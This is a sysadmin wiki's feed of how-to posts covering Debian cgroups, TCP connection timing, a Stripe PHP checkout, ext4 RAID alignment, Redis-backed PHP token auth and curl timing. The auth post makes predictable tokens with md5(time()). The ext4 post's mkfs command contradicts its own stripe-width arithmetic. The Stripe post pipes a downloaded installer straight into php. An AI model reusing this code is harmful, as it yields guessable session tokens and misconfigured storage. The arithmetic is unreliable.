&lt;p&gt;A good documentation about cgroups can be found at &lt;a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html" title="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html"&gt;https://access.redhat …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Control Groups are good, but the implementation in Debian 6 is a mess!
I know that this OS is not the latest, but when you have production servers, you don't always get the chance to run latest versions.&lt;/p&gt;
&lt;p&gt;A good documentation about cgroups can be found at &lt;a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html" title="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html"&gt;https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Let's take the issues &lt;em&gt;one&lt;/em&gt; by one:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; uname -a
&lt;span class="go"&gt;Linux box 2.6.32-5-amd64 #1 SMP Fri May 10 08:43:19 UTC 2013 x86_64 GNU/Linux&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; cat /proc/cgroups
&lt;span class="gp"&gt;#&lt;/span&gt;subsys_name hierarchy num_cgroups enabled
&lt;span class="go"&gt;cpuset 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;ns 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;cpu 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;cpuacct 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;devices 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;freezer 0 1 1&lt;/span&gt;
&lt;span class="go"&gt;net_cls 0 1 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;memory&lt;/code&gt; and &lt;code&gt;blkio&lt;/code&gt; controllers are missing! For my case, I didn't need disk control, but memory would have been nice. To enable memory control may need kernel compilation.&lt;/p&gt;
&lt;h4&gt;Problem number &lt;em&gt;two&lt;/em&gt;:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install cgroup-bin -y
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After the install, the services are started automatically.
But with some bad default settings (&lt;code&gt;CREATE_DEFAULT=yes&lt;/code&gt; in &lt;code&gt;/etc/default/cgconfig&lt;/code&gt;).
In my case I had to interrupt the installer because it hanged doing nothing (I guess it was creating the default cgroup and moving all processes there - not nice for busy server with tons of tasks running).
Also the subsystem is mounted under &lt;code&gt;/mnt/cgroups/&lt;/code&gt; - why ??
 &lt;/p&gt;
&lt;h4&gt;Problem number &lt;em&gt;three&lt;/em&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=609004" title="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=609004"&gt;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=609004&lt;/a&gt;
- the CGroup Rules Engine Daemon that was supposed to apply the cgroup mapping was not able to detect the new processes, so your configuration was worth nothing (unless manually applying it).&lt;/p&gt;
&lt;h4&gt;And the &lt;em&gt;last one&lt;/em&gt;:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;2428&amp;#39;&lt;/span&gt; &amp;gt; /sys/fs/cgroup/cpuset/limited/cgroup.procs
&lt;span class="go"&gt;-bash: echo: write error: Invalid argument&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I cannot add the parent pid to the cgroup (which would automatically add also all threads belonging to the parent to the same cgroup). So in my case, I had to add 1 parent and 256 threads to &lt;code&gt;/sys/fs/cgroup/cpuset/limited/tasks&lt;/code&gt;, and I had to do it one by one, you cannot add all 257 pids at once.
 &lt;/p&gt;
&lt;h4&gt;&lt;em&gt;Bottom line&lt;/em&gt; is cgroups are good, implementation sucks and I ended up in uninstalling the package and making a script to wrap up everything:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;mounting the needed controller&lt;/li&gt;
&lt;li&gt;creating the custom cgroup&lt;/li&gt;
&lt;li&gt;pushing all threads to the custom cgroup&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; mount -t tmpfs cgroup_root /sys/fs/cgroup
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /sys/fs/cgroup/cpuset
&lt;span class="gp"&gt;$&lt;/span&gt; mount -t cgroup cpuset -ocpuset /sys/fs/cgroup/cpuset
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /sys/fs/cgroup/cpuset
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir logstash
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; logstash
&lt;span class="gp"&gt;$&lt;/span&gt; /bin/echo &lt;span class="m"&gt;22&lt;/span&gt;-23 &amp;gt; cpuset.cpus
&lt;span class="gp"&gt;$&lt;/span&gt; /bin/echo &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; cpuset.mems
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; t in &lt;span class="sb"&gt;`&lt;/span&gt;ls /proc/&lt;span class="k"&gt;$(&lt;/span&gt;cat /var/run/logstash.pid&lt;span class="k"&gt;)&lt;/span&gt;/task/&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt; &amp;gt; tasks&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="bug"></category><category term="cgroups"></category><category term="debian6"></category><category term="logstash"></category></entry><entry><title>Get the start date of a currently established tcp connection</title><link href="http://wiki.jokeru.ro/how-to-get-the-start-date-of-a-currently-established-tcp-connection.html" rel="alternate"></link><published>2015-04-27T11:51:00+01:00</published><updated>2015-04-27T11:51:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-04-27:/how-to-get-the-start-date-of-a-currently-established-tcp-connection.html</id><summary type="html">&lt;h4&gt;It's that easy:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; get the needed session
&lt;span class="gp"&gt;$&lt;/span&gt; ss -t &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;10&lt;/span&gt;.21.10.22
&lt;span class="go"&gt;ESTAB 0 0 7.2.2.1:56120 10.21.10.22:65001&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; get the process and file descriptor that opened the session
&lt;span class="gp"&gt;$&lt;/span&gt; lsof -n &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;10&lt;/span&gt;.21.10.22:65001
&lt;span class="go"&gt;rsyslogd 6876 root 7u IPv4 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h4&gt;It's that easy:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; get the needed session
&lt;span class="gp"&gt;$&lt;/span&gt; ss -t &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;10&lt;/span&gt;.21.10.22
&lt;span class="go"&gt;ESTAB 0 0 7.2.2.1:56120 10.21.10.22:65001&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; get the process and file descriptor that opened the session
&lt;span class="gp"&gt;$&lt;/span&gt; lsof -n &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;10&lt;/span&gt;.21.10.22:65001
&lt;span class="go"&gt;rsyslogd 6876 root 7u IPv4 1224456667 0t0 TCP 7.2.2.1:56120-&amp;gt;10.21.10.22:65001 (ESTABLISHED)&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; get the creation date of file
&lt;span class="gp"&gt;$&lt;/span&gt; ls -la /proc/6876/fd/* &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;1224456667&lt;/span&gt;
&lt;span class="go"&gt;lrwx------ 1 root root 64 Apr 27 08:30 /proc/6876/fd/7 -&amp;gt; socket:[1224456667]  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So the TCP connection started at &lt;strong&gt;08:30&lt;/strong&gt;.&lt;/p&gt;</content><category term="tcp"></category></entry><entry><title>stripe - the web / mobile payment gateway</title><link href="http://wiki.jokeru.ro/how-to-stripe-the-web-mobile-payment-gateway.html" rel="alternate"></link><published>2015-04-14T14:14:00+01:00</published><updated>2015-04-14T14:14:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-04-14:/how-to-stripe-the-web-mobile-payment-gateway.html</id><summary type="html">&lt;p&gt;&lt;a href="https://stripe.com/" title="https://stripe.com/"&gt;Stripe&lt;/a&gt; is the easiest payment gateway I've setup so far!&lt;/p&gt;
&lt;p&gt;You can find all details about this service on their website, I will only mention that Twitter, Apple and Facebook are using it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; composer prerequisites
&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install php5 git php5-curl
&lt;span class="gp"&gt;#&lt;/span&gt; install stripe-php library with composer
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /var/www/stripe
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://stripe.com/" title="https://stripe.com/"&gt;Stripe&lt;/a&gt; is the easiest payment gateway I've setup so far!&lt;/p&gt;
&lt;p&gt;You can find all details about this service on their website, I will only mention that Twitter, Apple and Facebook are using it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; composer prerequisites
&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install php5 git php5-curl
&lt;span class="gp"&gt;#&lt;/span&gt; install stripe-php library with composer
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /var/www/stripe
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; /var/www/stripe/
&lt;span class="gp"&gt;$&lt;/span&gt; curl -sS https://getcomposer.org/installer &lt;span class="p"&gt;|&lt;/span&gt; php
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; composer.json
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt; &amp;quot;require&amp;quot;: {&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;stripe/stripe-php&amp;quot;: &amp;quot;2.*&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; }&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; php composer.phar install

&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; test.html
&lt;span class="go"&gt;&amp;lt;form action=&amp;quot;charge.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;script src=&amp;quot;https://checkout.stripe.com/checkout.js&amp;quot; class=&amp;quot;stripe-button&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;data-key=&amp;quot;pk_test_6pRNASCoBOKtIshFeQd4XMUh&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;data-amount=&amp;quot;2000&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;data-name=&amp;quot;Demo Site&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;data-description=&amp;quot;2 widgets ($20.00)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;data-image=&amp;quot;/128x128.png&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; charge.php
&lt;span class="go"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="go"&gt;require &amp;#39;vendor/autoload.php&amp;#39;;&lt;/span&gt;
&lt;span class="go"&gt;\\Stripe\\Stripe::setApiKey(&amp;quot;sk_test_BQokikJOvBiI2HlWgH4olfQ2&amp;quot;);&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;stripeToken&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="go"&gt;try {&lt;/span&gt;
&lt;span class="gp"&gt; $&lt;/span&gt;&lt;span class="nv"&gt;charge&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="se"&gt;\\&lt;/span&gt;Stripe&lt;span class="se"&gt;\\&lt;/span&gt;Charge::create&lt;span class="o"&gt;(&lt;/span&gt;array&lt;span class="o"&gt;(&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;amount&amp;quot; =&amp;gt; 2000, // amount in cents, again&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;currency&amp;quot; =&amp;gt; &amp;quot;usd&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;source&amp;quot; =&amp;gt; $token,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;description&amp;quot; =&amp;gt; &amp;quot;test charge&amp;quot;)&lt;/span&gt;
&lt;span class="go"&gt; );&lt;/span&gt;
&lt;span class="go"&gt; echo &amp;quot;ok&amp;quot;;&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt; other backend actions
&lt;span class="go"&gt;} catch(\\Stripe\\Error\\Card $e) {&lt;/span&gt;
&lt;span class="go"&gt; echo &amp;quot;error, card was declined&amp;quot;;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now open your browser, load &lt;code&gt;/stripe/test.html&lt;/code&gt; and that's all.&lt;/p&gt;</content><category term="api"></category><category term="mobile"></category><category term="payment"></category><category term="php"></category><category term="stripe"></category><category term="web"></category></entry><entry><title>Chunk size, stride size, stripe size, ext4, alignment ...</title><link href="http://wiki.jokeru.ro/how-to-chunk-size-stride-size-stripe-size-ext4-alignment.html" rel="alternate"></link><published>2015-04-06T17:57:00+01:00</published><updated>2015-04-06T17:57:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-04-06:/how-to-chunk-size-stride-size-stripe-size-ext4-alignment.html</id><summary type="html">&lt;p&gt;In order to get the best performance from your RAID storage, you need to align everything (the filesystem with your RAID setup)!&lt;/p&gt;
&lt;p&gt;1 - &lt;strong&gt;chunk size&lt;/strong&gt; of raid array - how you choose this value is not under this post's scope, let's consider the default for my raid controller - 256k&lt;/p&gt;
&lt;p&gt;2 - filesystem …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In order to get the best performance from your RAID storage, you need to align everything (the filesystem with your RAID setup)!&lt;/p&gt;
&lt;p&gt;1 - &lt;strong&gt;chunk size&lt;/strong&gt; of raid array - how you choose this value is not under this post's scope, let's consider the default for my raid controller - 256k&lt;/p&gt;
&lt;p&gt;2 - filesystem &lt;strong&gt;block size&lt;/strong&gt; (ext4) is set to default - 4k&lt;/p&gt;
&lt;p&gt;3 - filesystem &lt;strong&gt;stride&lt;/strong&gt; = array chunk size / filesystem block size: &lt;code&gt;256k / 4k = 64k&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4 - filesystem &lt;strong&gt;stripe-width&lt;/strong&gt; = filesystem stride * number of data disks in array (for a raid5 with 4 disks, this will be 3): &lt;code&gt;64k * 3 = 192k&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;So this will translate into:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; mkfs.ext4 -b &lt;span class="m"&gt;4096&lt;/span&gt; -E &lt;span class="nv"&gt;stride&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64&lt;/span&gt; -E stripe-width&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64&lt;/span&gt; /dev/sdb
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Or if you're too lazy to do the math, you can use this online calculator:&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://busybox.net/~aldot/mkfs_stride.html" title="http://busybox.net/~aldot/mkfs_stride.html"&gt;http://busybox.net/~aldot/mkfs_stride.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="chunk"></category><category term="ext4"></category><category term="raid"></category><category term="stride"></category><category term="stripe-width"></category></entry><entry><title>Token Authentication in PHP with Redis</title><link href="http://wiki.jokeru.ro/how-to-token-authentication-in-php-with-redis.html" rel="alternate"></link><published>2015-04-01T23:10:00+01:00</published><updated>2015-04-01T23:10:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-04-01:/how-to-token-authentication-in-php-with-redis.html</id><summary type="html">&lt;p&gt;In this post I'll show you how to create and use a token based
authentication (something like OAuth2 but waaay lighter) in PHP. The
token will expire after a certain period of time. In order to keep the
token alive, I've also added a heartbeat function on the client side …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post I'll show you how to create and use a token based
authentication (something like OAuth2 but waaay lighter) in PHP. The
token will expire after a certain period of time. In order to keep the
token alive, I've also added a heartbeat function on the client side
which re-activates the token from time to time.&lt;/p&gt;
&lt;p&gt;The flow is like this:&lt;br&gt;
1 - the user logins with valid credentials&lt;br&gt;
2 - the server creates the user auth token (in Redis), sets the
TimeToLive (10 minutes) for it, and then returns the token value to the
user&lt;br&gt;
3 - a) the heartbeat mechanism is started to keep the token active
(when the server receives the heartbeat, the TTL is reset to 10
minutes)&lt;br&gt;
3 - b) all user communication includes the auth token&lt;br&gt;
4 - if the heartbeat is not received on server side, the token will
expire and the user session will be closed&lt;/p&gt;
&lt;p&gt;Install prerequisites:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\# get redis  &lt;/span&gt;
&lt;span class="go"&gt;\$ apt-get install redis-server -y  &lt;/span&gt;
&lt;span class="go"&gt;\# default config for redis is ok  &lt;/span&gt;
&lt;span class="go"&gt;\$ /etc/init.d/redis-server restart&lt;/span&gt;

&lt;span class="go"&gt;\# get predis - a flexible and feature-complete Redis client library for&lt;/span&gt;
&lt;span class="go"&gt;PHP \&amp;gt;= 5.3  &lt;/span&gt;
&lt;span class="go"&gt;\$ apt-get install git -y  &lt;/span&gt;
&lt;span class="go"&gt;\$ cd /var/www/  &lt;/span&gt;
&lt;span class="go"&gt;\$ git clone git://github.com/nrk/predis.git  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Create token:&lt;br&gt;
[cc lang='php']&lt;br&gt;
\$ttl = 600;&lt;br&gt;
\$server_token = md5(time());&lt;br&gt;
require "predis/autoload.php";&lt;br&gt;
try {&lt;br&gt;
\$redis = new Predis\Client(array("scheme" =&gt; "tcp", "host" =&gt;
"127.0.0.1", "port" =&gt; 6379));&lt;br&gt;
\$key = \$server_token;&lt;br&gt;
\$redis-&gt;set("\$key", "");&lt;br&gt;
\$redis-&gt;expire("\$key", \$ttl);&lt;br&gt;
} catch (Exception \$e) {&lt;br&gt;
return _build_response( ERROR, \$e-&gt;getMessage()) );&lt;br&gt;
}  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Check token:  
[cc lang=&amp;#39;php&amp;#39;]  
require &amp;quot;libs/predis/autoload.php&amp;quot;;  
try {  
\$redis = new Predis\\Client(array(&amp;quot;scheme&amp;quot; =\&amp;gt; &amp;quot;tcp&amp;quot;, &amp;quot;host&amp;quot; =\&amp;gt;
&amp;quot;127.0.0.1&amp;quot;, &amp;quot;port&amp;quot; =\&amp;gt; 6379));  
\$key = \$user\_token;  
if (!\$redis-\&amp;gt;exists(&amp;quot;\$key&amp;quot;)) {  
return \_build\_response( ERROR, &amp;quot;session expired&amp;quot; );  
}  
} catch (Exception \$e) {  
return \_build\_response( ERROR, \$e-\&amp;gt;getMessage()) );  
}  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Heartbeat:&lt;br&gt;
[cc lang='php']&lt;br&gt;
\$ttl = 600;&lt;br&gt;
require "libs/predis/autoload.php";&lt;br&gt;
try {&lt;br&gt;
\$redis = new Predis\Client(array("scheme" =&gt; "tcp", "host" =&gt;
"127.0.0.1", "port" =&gt; 6379));&lt;br&gt;
\$key = \$user_token;&lt;br&gt;
if (\$redis-&gt;exists("\$key")) {&lt;br&gt;
\$redis-&gt;expire("\$key", \$ttl);&lt;br&gt;
}&lt;br&gt;
} catch (Exception \$e) {&lt;br&gt;
return _build_response( ERROR, \$e-&gt;getMessage()) );&lt;br&gt;
}&lt;br&gt;
```&lt;/p&gt;</content><category term="auth"></category><category term="oauth"></category><category term="oauth2"></category><category term="PHP"></category><category term="predis"></category><category term="redis"></category><category term="token"></category></entry><entry><title>Vesta - Hosting Control Panel</title><link href="http://wiki.jokeru.ro/how-to-vesta-hosting-control-panel.html" rel="alternate"></link><published>2015-03-24T22:44:00+00:00</published><updated>2015-03-24T22:44:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-03-24:/how-to-vesta-hosting-control-panel.html</id><summary type="html">&lt;p&gt;If you're looking for a simple, yet powerful hosting control panel,
&lt;a href="http://vestacp.com/" title="http://vestacp.com/"&gt;Vesta&lt;/a&gt; could be the one.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="VestaCP" src="http://vestacp.com/images/slides/list_user.png" title="VestaCP"&gt;  &lt;/p&gt;
&lt;p&gt;Install: it's a one-liner, they have a script that takes care of
everything&lt;/p&gt;
&lt;p&gt;Usage: this panel can be used by both experienced sys admins and regular
users, the design is very clean and fluent …&lt;/p&gt;</summary><content type="html">&lt;p&gt;If you're looking for a simple, yet powerful hosting control panel,
&lt;a href="http://vestacp.com/" title="http://vestacp.com/"&gt;Vesta&lt;/a&gt; could be the one.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="VestaCP" src="http://vestacp.com/images/slides/list_user.png" title="VestaCP"&gt;  &lt;/p&gt;
&lt;p&gt;Install: it's a one-liner, they have a script that takes care of
everything&lt;/p&gt;
&lt;p&gt;Usage: this panel can be used by both experienced sys admins and regular
users, the design is very clean and fluent&lt;/p&gt;
&lt;p&gt;Performance: it's using a Nginx reverse proxy to Apache configuration,
so you'll not end up with dropping connections on traffic peaks&lt;/p&gt;
&lt;p&gt;API: you can script various actions like mass-adding sites by using
their API interface&lt;/p&gt;</content><category term="control panel"></category><category term="hosting"></category><category term="vesta"></category><category term="vestacp"></category></entry><entry><title>Measure web server response time with cURL</title><link href="http://wiki.jokeru.ro/how-to-measure-web-server-response-time-with-curl.html" rel="alternate"></link><published>2015-03-12T15:15:00+00:00</published><updated>2015-03-12T15:15:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-03-12:/how-to-measure-web-server-response-time-with-curl.html</id><summary type="html">&lt;p&gt;cURL is mostly used to retrieve web content, but it also can provide feedback for a sysadmin / network admin / webmaster.&lt;/p&gt;
&lt;h4&gt;Let's take an example:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; curl-info
&lt;span class="go"&gt;time_namelookup: %{time_namelookup}\n&lt;/span&gt;
&lt;span class="go"&gt;time_connect: %{time_connect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_appconnect: %{time_appconnect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_pretransfer: %{time_pretransfer}\n&lt;/span&gt;
&lt;span class="go"&gt;time_redirect: %{time_redirect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_starttransfer: %{time_starttransfer}\n&lt;/span&gt;
&lt;span class="go"&gt;size_download: %{size_download} Bytes\n&lt;/span&gt;
&lt;span class="go"&gt;----------\n …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;cURL is mostly used to retrieve web content, but it also can provide feedback for a sysadmin / network admin / webmaster.&lt;/p&gt;
&lt;h4&gt;Let's take an example:&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; curl-info
&lt;span class="go"&gt;time_namelookup: %{time_namelookup}\n&lt;/span&gt;
&lt;span class="go"&gt;time_connect: %{time_connect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_appconnect: %{time_appconnect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_pretransfer: %{time_pretransfer}\n&lt;/span&gt;
&lt;span class="go"&gt;time_redirect: %{time_redirect}\n&lt;/span&gt;
&lt;span class="go"&gt;time_starttransfer: %{time_starttransfer}\n&lt;/span&gt;
&lt;span class="go"&gt;size_download: %{size_download} Bytes\n&lt;/span&gt;
&lt;span class="go"&gt;----------\n&lt;/span&gt;
&lt;span class="go"&gt;time_total: %{time_total}\n&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; curl -s -w&lt;span class="s1"&gt;&amp;#39;@curl-info&amp;#39;&lt;/span&gt; wiki.jokeru.ro -o /dev/null
&lt;span class="go"&gt;time_namelookup: 0.173&lt;/span&gt;
&lt;span class="go"&gt;time_connect: 0.338&lt;/span&gt;
&lt;span class="go"&gt;time_appconnect: 0.000&lt;/span&gt;
&lt;span class="go"&gt;time_pretransfer: 0.338&lt;/span&gt;
&lt;span class="go"&gt;time_redirect: 0.000&lt;/span&gt;
&lt;span class="go"&gt;time_starttransfer: 1.077&lt;/span&gt;
&lt;span class="go"&gt;size_download: 125156 Bytes&lt;/span&gt;
&lt;span class="go"&gt;----------&lt;/span&gt;
&lt;span class="go"&gt;time_total: 2.495&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;The output is very simple to understand:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;name resolution for wiki.jokeru.ro took 0.173 seconds&lt;/li&gt;
&lt;li&gt;a tcp connection with the remote server (wiki.jokeru.ro on port 80) was established after 0.165 seconds (0.338 - 0.173)&lt;/li&gt;
&lt;li&gt;0.739 seconds (1.077 - 0.338) is the delay between the first byte that is about to be transferred from the server and the moment when the connection was established and the request was sent (this is mostly the web server processing time: reading files, mysql queries, computing stuff ... whatever)&lt;/li&gt;
&lt;li&gt;we also see a problem with the connection speed: 125156 Bytes received in 1.418 seconds (2.495 - 1.077), that is 706 kbps&lt;/li&gt;
&lt;/ul&gt;</content><category term="curl"></category><category term="debug"></category><category term="performance"></category></entry><entry><title>For your stats / metrics: InfluxDB and Grafana</title><link href="http://wiki.jokeru.ro/how-to-for-your-stats-metrics-influxdb-and-grafana.html" rel="alternate"></link><published>2015-02-19T15:10:00+00:00</published><updated>2015-02-19T15:10:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-02-19:/how-to-for-your-stats-metrics-influxdb-and-grafana.html</id><summary type="html">&lt;p&gt;Need a quick way to visualize statistics or custom metrics ?&lt;br&gt;
You like nice graphs - Kibana style ?&lt;/p&gt;
&lt;p&gt;&lt;a href="http://grafana.org/" title="http://grafana.org/"&gt;Grafana&lt;/a&gt; is the answer (the
presentation layer).&lt;br&gt;
